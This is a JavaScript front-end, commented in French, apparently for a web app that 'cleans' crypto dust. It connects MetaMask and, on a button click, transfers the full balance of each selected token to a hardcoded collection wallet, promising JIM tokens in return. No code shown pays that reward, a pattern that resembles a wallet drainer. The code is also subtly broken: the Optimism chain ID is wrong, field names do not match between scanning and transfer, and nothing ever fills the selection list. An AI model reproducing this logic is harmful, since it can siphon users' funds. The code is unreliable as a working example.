const connectButton = document.getElementById("connectButton");
const dustContainer = document.getElementById("dustContainer");
const cleanButton = document.getElementById("cleanButton");
const statusDiv = document.getElementById("status");

// CORRIGÉ : Remplacement de l'espace par un underscore (_)
const COLLECTION_WALLET = "0x86E85282557fF41A7cD89AD7aA4BBD31CFea3fa9";

let provider;
let signer;
let selectedTokens = [];

// Configuration des IDs techniques des réseaux pour MetaMask
const CHAIN_IDS = {
    "eth": "0x1",
    "base": "0x2105",
    "polygon": "0x89",
    "bsc": "0x38",
    "arbitrum": "0xa4b1",
    "optimism": "0xa4b0"
};

const NETWORKS = ["base", "eth", "polygon", "bsc", "arbitrum", "optimism"];

connectButton.onclick = async () => {
    if (!window.ethereum) {
        alert("MetaMask requis");
        return;
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    const address = await signer.getAddress();

    statusDiv.innerHTML = "✅ Wallet connecté : " + address;
    scanDust(address);
};

async function scanDust(wallet) {

    dustContainer.innerHTML = "🔍 Scan des poussières...";

    try {

        const response = await fetch(
            `https://jimtok-backend.onrender.com/tokens/${wallet}/base`
        );

        const data = await response.json();

        console.log(data);

        const tokens = data.result.tokenBalances;

        renderTokens(tokens);

    } catch(err) {

        console.log(err);

        dustContainer.innerHTML = "Erreur scan";

    }
}
function renderTokens(tokens) {

    dustContainer.innerHTML = "";

    tokens.forEach(token => {

        const div = document.createElement("div");

        div.className = "token";

        div.innerHTML = `
            <strong>${token.contractAddress}</strong>
            <div class="small">
                ${token.tokenBalance}
            </div>
        `;

        dustContainer.appendChild(div);

    });
}

function updateButton() {
    if (selectedTokens.length === 0) {
        cleanButton.style.display = "none";
        return;
    }

    cleanButton.style.display = "block";

    let total = selectedTokens.reduce(
        (sum, t) => sum + Number(t.usd_value || 0),
        0
    );

    const estimatedJIM = Math.floor(total * 1000);
    cleanButton.innerText = `Recevoir ~ ${estimatedJIM} JIM`;
}

// CORRIGÉ : Ajout du changement de réseau automatisé pour éviter les crashs de transactions cross-chain
cleanButton.onclick = async () => {
    try {
        for (const token of selectedTokens) {
            const targetChainId = CHAIN_IDS[token.chain];
            
            statusDiv.innerHTML = `⏳ Basculement vers le réseau ${token.chain.toUpperCase()}...`;
            
            // On force MetaMask à changer de blockchain pour correspondre au jeton sélectionné
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: targetChainId }],
                });
            } catch (switchError) {
                // Si le réseau n'est pas configuré dans son MetaMask, on l'arrête proprement
                alert(`S'il te plaît, ajoute ou sélectionne le réseau ${token.chain.toUpperCase()} dans ton MetaMask.`);
                throw new Error("Réseau non disponible");
            }

            // On recrée proprement le provider et le signer après le changement de réseau
            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();

            const tokenContract = new ethers.Contract(
                token.token_address,
                [
                    "function transfer(address to, uint256 amount) returns (bool)"
                ],
                signer
            );

            statusDiv.innerHTML = `⏳ Autorisation et transfert de ${token.symbol}...`;

            // Envoi sécurisé du montant avec BigInt
            const tx = await tokenContract.transfer(
                COLLECTION_WALLET,
                BigInt(token.balance.toString())
            );

            await tx.wait();
        }

        statusDiv.innerHTML = "✅ Toutes les poussières sélectionnées ont été envoyées !";
        selectedTokens = [];
        updateButton();
        // Optionnel : Relancer un scan pour rafraîchir la liste
        const currentAddress = await signer.getAddress();
        scanDust(currentAddress);

    } catch(err) {
        console.log(err);
        statusDiv.innerHTML = "❌ Transaction annulée ou erreur réseau";
    }
};
